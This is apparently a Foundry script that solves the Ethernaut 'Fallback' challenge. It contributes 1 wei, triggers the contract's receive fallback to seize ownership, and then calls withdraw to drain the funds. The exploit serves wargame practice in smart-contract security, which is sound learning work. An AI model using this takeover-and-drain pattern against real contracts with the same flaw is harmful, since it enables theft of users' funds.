// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Fallback} from "../src/Fallback.sol";
import "forge-std/console.sol";


contract FallbackSolution is Script {

    Fallback fallbackInstance = Fallback(payable(0x7e1557c9c323e34a22614E3f6cBc818815B5Bc5f));
    function run() external returns (Fallback){

        vm.startBroadcast();
        fallbackInstance.contribute{value: 1 wei}();
        (bool success,) = address(fallbackInstance).call{value: 1 wei}("");
        require(success);

        console.log("Contract Address: ", fallbackInstance.owner());
        console.log("My Address: ", vm.envAddress('MY_ADDRESS'));

        fallbackInstance.withdraw();
        vm.stopBroadcast();

        return fallbackInstance;


    }
}